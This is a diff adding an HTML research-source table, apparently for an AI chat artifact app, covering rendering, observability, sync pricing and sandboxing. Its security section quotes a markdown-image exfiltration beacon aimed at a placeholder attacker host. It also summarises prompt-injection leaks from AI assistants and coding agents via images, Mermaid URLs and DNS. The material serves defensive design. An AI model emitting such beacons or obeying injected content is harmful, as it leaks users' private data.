+<td>bughunters.google.com/blog/...safecontentframe</td>
+<td>official/security</td>
+<td>acc 2026-07-13 (JS-rendered, re-verify)</td>
+<td>Gemini renders untrusted content via SafeContentFrame — unique per-hash origin under *.scf.usercontent.goog, postMessage origin+hash verification, blob-URL rendering</td>
+<td>med</td>
+<td>c1-google-safecontentframe.md</td>
+</tr>
+<tr>
+<td>gemini.google/overview/canvas + support threads</td>
+<td>official + community</td>
+<td>acc 2026-07-13</td>
+<td>Gemini Canvas has Editor/Preview/Code tabs w/ live render, but each update generates a new artifact (no durable versioning); users report not saving across sessions</td>
+<td>med-high</td>
+<td>c1-gemini-canvas-overview.md</td>
+</tr>
+<tr>
+<td>aitooldiscovery.com/guides/claude-reddit</td>
+<td>community</td>
+<td>acc 2026-07-13</td>
+<td>r/ClaudeAI sentiment treats Artifacts as a &quot;gamechanger&quot; (used/praised) vs ChatGPT Canvas resentment/retirement</td>
+<td>med</td>
+<td>c1-claude-artifacts-community-sentiment.md</td>
+</tr>
+</tbody></table>
+<h2>C4 — Trace/observability + notebooks</h2>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>type</th>
+<th>date/accessed</th>
+<th>claim</th>
+<th>confidence</th>
+<th>capture</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>langchain.com/langsmith + docs.langchain.com/langsmith/observability-concepts</td>
+<td>official</td>
+<td>acc 2026-07-13</td>
+<td>LangSmith renders full span-tree/waterfall of every LLM/tool call w/ token+cost; ships &quot;Polly&quot; AI to help understand large traces</td>
+<td>high</td>
+<td>c4-langsmith-trace-ux.md</td>
+</tr>
+<tr>
+<td>langfuse.com/docs/observability</td>
+<td>official</td>
+<td>acc 2026-07-13</td>
+<td>Langfuse: trace=request, observations=span/generation/agent rendered as timed waterfall; per-trace/user/model token+cost</td>
+<td>high</td>
+<td>c4-langfuse-datamodel.md</td>
+</tr>
+<tr>
+<td>agentops.ai + docs.agentops.ai</td>
+<td>official</td>
+<td>acc 2026-07-13</td>
+<td>AgentOps session replay = visual step-by-step timeline; time-travel rewind to inspect execution state at any step</td>
+<td>high</td>
+<td>c4-agentops-replay.md</td>
+</tr>
+<tr>
+<td>langchain.com/resources/agent-observability; braintrust.dev; MS Foundry &amp; AWS AgentCore docs</td>
+<td>official/vendor</td>
+<td>acc 2026-07-13</td>
+<td>Traces are for developers/ops/auditors, not end users; reconstruct execution &quot;so teams understand&quot; vs showing users final output</td>
+<td>high</td>
+<td>c4-trace-audience-who-reads.md</td>
+</tr>
+<tr>
+<td>traceloop.com/blog; braintrust.dev/articles/llm-observability-guide; agenta.ai; patronus.ai</td>
+<td>vendor eng-blog</td>
+<td>acc 2026-07-13</td>
+<td>Traces get noisy/overwhelming at scale; framework/HTTP spans add noise; need sampling + AI to summarize</td>
+<td>med-high</td>
+<td>c4-trace-noise-overload.md</td>
+</tr>
+<tr>
+<td>arize.com/phoenix; braintrust.dev; helicone.ai (via comparisons)</td>
+<td>vendor</td>
+<td>acc 2026-07-13</td>
+<td>Phoenix=OTel/OpenInference OSS tracing; Braintrust=evals+prompt versioning+CI; Helicone=proxy logging; all span-tree over OTel</td>
+<td>med</td>
+<td>c4-phoenix-braintrust-helicone.md</td>
+</tr>
+<tr>
+<td>Grus JupyterCon 2018 &quot;I Don&#39;t Like Notebooks&quot;; yihui.org/en/2018/09/notebook-war; HN 19859913</td>
+<td>talk + community</td>
+<td>acc 2026-07-13</td>
+<td>Top notebook complaint = hidden state / out-of-order execution; visible output may not match a clean rerun</td>
+<td>high</td>
+<td>c4-joel-grus-notebooks.md</td>
+</tr>
+<tr>
+<td>Pimentel et al. MSR 2019 (1.4M notebooks); PMC8106381; GigaScience giad113</td>
+<td>academic</td>
+<td>acc 2026-07-13</td>
+<td>~24% of notebooks run clean, ~4% reproduce identical results; 36% out-of-order; 76% skips</td>
+<td>high</td>
+<td>c4-notebook-reproducibility-studies.md</td>
+</tr>
+<tr>
+<td>marimo.io/features/vs-jupyter; github.com/marimo-team/marimo; marimo.io/blog/dataflow</td>
+<td>official (biased)</td>
+<td>acc 2026-07-13</td>
+<td>Marimo reactive DAG kills hidden state; deleting a cell scrubs its vars; stored as git-friendly pure Python</td>
+<td>high (feat) / med (claims)</td>
+<td>c4-marimo-reactive.md</td>
+</tr>
+<tr>
+<td>nbdime.readthedocs.io; github.com/jupyter/nbdime; JEP-08; reviewnb blog</td>
+<td>official + vendor</td>
+<td>acc 2026-07-13</td>
+<td>Notebook JSON diffs are unreadable and merges painful; content-aware/rendered diff needed to make versions legible</td>
+<td>high</td>
+<td>c4-notebook-versioning-nbdime.md</td>
+</tr>
+<tr>
+<td>kdnuggets notebook-anti-pattern; FlowBook arXiv 2605.01560; simonwillison observable</td>
+<td>community + academic</td>
+<td>acc 2026-07-13</td>
+<td>Notebooks-in-production = anti-pattern; reactive systems give ordering but not full reproducibility</td>
+<td>med-high</td>
+<td>c4-notebook-antipattern-observable.md</td>
+</tr>
+<tr>
+<td>simonw.substack transcript extraction; claude-dev.tools; code.claude.com agent-loop</td>
+<td>community + official</td>
+<td>acc 2026-07-13</td>
+<td>Claude Code collapses tool calls to 1-liners (too little) or --verbose JSON firehose (too much); 3rd-party tools reconstruct inline Edit diffs</td>
+<td>med</td>
+<td>c4-claude-code-transcripts.md</td>
+</tr>
+</tbody></table>
+<h2>C5 — Sync / auth / attachment infrastructure</h2>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>type</th>
+<th>date/accessed</th>
+<th>claim</th>
+<th>confidence</th>
+<th>capture</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>developers.cloudflare.com/durable-objects/platform/pricing</td>
+<td>official</td>
+<td>acc 2026-07-13</td>
+<td>DO Paid: $5/mo acct min (1M req + 400k GB-s incl); free 100k req/day + 13k GB-s/day, SQLite only; WS counts 20:1 incoming</td>
+<td>high</td>
+<td>c5-durable-objects-pricing.md</td>
+</tr>
+<tr>
+<td>convex.dev/pricing</td>
+<td>official</td>
+<td>acc 2026-07-13</td>
+<td>Convex Free: 1M func calls, 0.5GB DB, 1GB files, $0 base; Pro $25/dev/mo; overages pay-as-you-go</td>
+<td>high</td>
+<td>c5-convex-pricing.md</td>
+</tr>
+<tr>
+<td>supabase.com/pricing</td>
+<td>official</td>
+<td>acc 2026-07-13</td>
+<td>Supabase Free: 500MB DB, 1GB storage, 200 realtime conns; free projects auto-pause ~7d idle; Pro $25/mo</td>
+<td>high</td>
+<td>c5-supabase-free-tier.md</td>
+</tr>
+<tr>
+<td>developers.cloudflare.com/r2/pricing</td>
+<td>official</td>
+<td>acc 2026-07-13</td>
+<td>R2 free 10GB + zero egress always; $0.015/GB beyond; presigned URLs can&#39;t use custom domains (serve via Worker on separate subdomain)</td>
+<td>high</td>
+<td>c5-r2-attachments-pricing.md</td>
+</tr>
+<tr>
+<td>fly.io/docs/about/pricing; vercel.com/pricing; railway.com/pricing</td>
+<td>official + community</td>
+<td>acc 2026-07-13</td>
+<td>Fly shared-cpu-1x 256MB ≈$2/mo always-on; Vercel Hobby free but NO WebSockets/long-running; Railway Hobby $5/mo w/ $5 credit supports WS</td>
+<td>high (Fly/Vercel) / med (Railway)</td>
+<td>c5-hosting-fly-railway-vercel.md</td>
+</tr>
+<tr>
+<td>liveblocks.io/pricing; partykit.io; jamsocket.com/y-sweet</td>
+<td>official</td>
+<td>acc 2026-07-13</td>
+<td>Liveblocks free 500 rooms/$25 Pro (built on Yjs); PartyKit acquired by Cloudflare (Workers+DO); Y-Sweet managed hosting winding down</td>
+<td>high (Liveblocks) / med</td>
+<td>c5-liveblocks-partykit-ysweet.md</td>
+</tr>
+<tr>
+<td>electric-sql.com/blog/2026/04/02/electric-cloud-pricing</td>
+<td>official</td>
+<td>acc 2026-07-13</td>
+<td>Electric = read-path Postgres sync ($1/M writes + $2/M shape-log writes); self-host Elixir/Docker + your Postgres; no write coordination/agent runtime</td>
+<td>high</td>
+<td>c5-electric-sql.md</td>
+</tr>
+<tr>
+<td>convex.dev/compare/supabase; devtoolsacademy.com</td>
+<td>vendor/community</td>
+<td>acc 2026-07-13</td>
+<td>Convex: every query = live subscription, strict-serializable; Supabase WAL realtime = weaker consistency</td>
+<td>med</td>
+<td>c5-realtime-convex-vs-supabase-vs-do.md</td>
+</tr>
+<tr>
+<td>developers.cloudflare.com/durable-objects/best-practices/websockets; sunilpai.dev/posts/reliable-ux-for-ai-chat-with-durable-objects</td>
+<td>official + community</td>
+<td>acc 2026-07-13</td>
+<td>DO WebSocket Hibernation: sockets stay open while DO evicted, duration billing pauses; DO owns message log, streams agent tokens, resumes on reconnect</td>
+<td>high (official) / med-high (blog)</td>
+<td>c5-do-websocket-reconnection.md</td>
+</tr>
+<tr>
+<td>developers.cloudflare.com/cloudflare-one/access-controls/policies; .../one-time-pin</td>
+<td>official</td>
+<td>acc 2026-07-13</td>
+<td>Cloudflare Access free ≤50 users; email-allowlist-of-one via OTP, edge-enforced, ~15min no code</td>
+<td>high</td>
+<td>c5-cloudflare-access-auth-for-one.md</td>
+</tr>
+<tr>
+<td>electric.ax/blog/2026/04/08/ai-agents-as-crdt-peers-with-yjs</td>
+<td>community/blog</td>
+<td>acc 2026-07-13</td>
+<td>Pattern: agent as server-side Yjs peer; CRDT avoids LWW data loss on concurrent same-region edits (edge case for 1+1)</td>
+<td>med</td>
+<td>c5-crdt-vs-server-authoritative.md</td>
+</tr>
+</tbody></table>
+<h2>C6 — Security &amp; sandboxing deep dive</h2>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>type</th>
+<th>date/accessed</th>
+<th>claim</th>
+<th>confidence</th>
+<th>capture</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>developer.mozilla.org/.../iframe + /CSP/sandbox (W3C CSP3)</td>
+<td>official/standards</td>
+<td>acc 2026-07-13</td>
+<td><code>sandbox=&quot;allow-scripts&quot;</code> WITHOUT <code>allow-same-origin</code> forces opaque/null origin so frame JS can&#39;t read app cookies/localStorage/DOM; both together lets frame remove its own sandbox = no security</td>
+<td>high</td>
+<td>c6-iframe-sandbox-allow-scripts-not-same-origin.md</td>
+</tr>
+<tr>
+<td>web.dev/articles/sandboxed-iframes</td>
+<td>official (Google)</td>
+<td>acc 2026-07-13</td>
+<td>same-origin+scripts lets framed page &quot;remove the sandbox attribute entirely&quot;; grant minimum capabilities</td>
+<td>high</td>
+<td>c6-webdev-sandboxed-iframes.md</td>
+</tr>
+<tr>
+<td>reidbarber.com/blog/reverse-engineering-claude-artifacts</td>
+<td>community (reverse-eng)</td>
+<td>acc 2026-07-13</td>
+<td>Claude Artifacts: separate origin claudeusercontent.com, <code>CSP: sandbox allow-scripts</code>, one-way postMessage bridge, cdnjs allowlist; no per-render VM</td>
+<td>med-high</td>
+<td>c6-claude-artifacts-architecture.md</td>
+</tr>
+<tr>
+<td>tldraw.dev/blog/make-real-the-story-so-far + make-real-starter</td>
+<td>official (eng+OSS)</td>
+<td>acc 2026-07-13</td>
+<td>Make Real renders AI HTML via <code>srcDoc</code> + <code>sandbox=&quot;allow-scripts&quot;</code> on-canvas; no same-origin, no top-nav</td>
+<td>high</td>
+<td>c6-tldraw-make-real.md</td>
+</tr>
+<tr>
+<td>MDN CSP sandbox + OWASP CSP Cheat Sheet + W3C CSP3</td>
+<td>official/standards</td>
+<td>acc 2026-07-13</td>
+<td><code>default-src &#39;none&#39;; connect-src &#39;none&#39;; img-src</code> allowlist kills fetch/XHR/WebSocket/beacon + <code>&lt;img&gt;</code> exfil; CSP <code>sandbox</code> directive = header form (invalid in <code>&lt;meta&gt;</code>/Report-Only)</td>
+<td>high</td>
+<td>c6-csp-block-egress.md</td>
+</tr>
+<tr>
+<td>embracethered.com/.../chatgpt-webpilot-data-exfil; simonwillison.net</td>
+<td>primary (researcher)</td>
+<td>acc 2026-07-13</td>
+<td>Identical markdown-image beacon <code>![x](https://attacker/q=data)</code> leaked data from ChatGPT, Bard, Amazon Q, NotebookLM, Anthropic, Copilot Chat, Slack AI</td>
+<td>high</td>
+<td>c6-markdown-image-exfil-incidents.md</td>
+</tr>
+<tr>
+<td>simonwillison.net/2025/Jun/11/echoleak; CVE-2025-32711 (Aim Security)</td>
+<td>primary-adjacent/disclosure</td>
+<td>disclosed 2025-06 / acc 2026-07-13</td>
+<td>EchoLeak (CVSS 9.3): zero-click M365 Copilot exfil via auto-fetched reference-style markdown image routed through a Teams-proxy host ON the CSP allowlist → prefer <code>&#39;none&#39;</code> over host allowlists</td>
+<td>high</td>
+<td>c6-echoleak-copilot-cve-2025-32711.md</td>
+</tr>
+<tr>
+<td>simonwillison.net/2025/Aug/15/the-summer-of-johann (Rehberger)</td>
+<td>primary (researcher)</td>
+<td>2025-08 / acc 2026-07-13</td>
+<td>Sweep of 8 coding agents: exfil via markdown images, Mermaid image URLs, DNS lookups (bypass HTTP allowlists) — but needs shell/DNS/tool access a render-only browser artifact lacks</td>
+<td>high</td>
+<td>c6-summer-of-johann-agent-exfil.md</td>
+</tr>
+<tr>
+<td>GitHub advisories (plane #1988, camaleon GHSL-2024-184, shopware/traccar/saleor SVG)</td>
+<td>primary (disclosures)</td>
+<td>acc 2026-07-13</td>
+<td>Untrusted uploaded HTML/SVG served inline from app origin = stored XSS; fix = separate content origin + <code>Content-Disposition: attachment</code> + <code>X-Content-Type-Options: nosniff</code></td>
+<td>high</td>
+<td>c6-untrusted-attachments-serving.md</td>
+</tr>
+<tr>
+<td>blog.val.town/blog/first-four-val-town-runtimes</td>
+<td>official (vendor eng)</td>
+<td>acc 2026-07-13</td>
+<td>Server-side untrusted JS execution needs Deno-subprocess/OS sandbox (&quot;can&#39;t build a JS sandbox in JS&quot;) — the heavy execution tier, distinct from render</td>
+<td>high</td>
+<td>c6-valtown-server-sandbox.md</td>
+</tr>
+<tr>
+<td>vercel.com/changelog/vercel-sandboxes-ga; e2b; modal.com; developers.cloudflare.com/workers security-model</td>
+<td>primary + secondary</td>
+<td>acc 2026-07-13</td>
+<td>Vercel Sandbox/e2b/Cloudflare run untrusted code EXECUTION in Firecracker microVMs / V8 isolates — a different requirement (server resources) than rendering HTML in the user&#39;s browser</td>
+<td>high</td>
+<td>c6-server-vm-sandboxes-vercel-e2b-firecracker.md</td>
+</tr>
+<tr>
+<td>(cross-cluster synthesis)</td>
+<td>synthesis</td>
+<td>acc 2026-07-13</td>
+<td>Cheap+safe RENDER-only = static separate-origin sandboxed iframe (opaque origin) + strict egress CSP + nosniff/Content-Disposition, all static config; microVMs only needed for server-side code execution</td>
+<td>high</td>
+<td>c6-cheap-safe-synthesis.md</td>
+</tr>
+</tbody></table>
+</body></html>
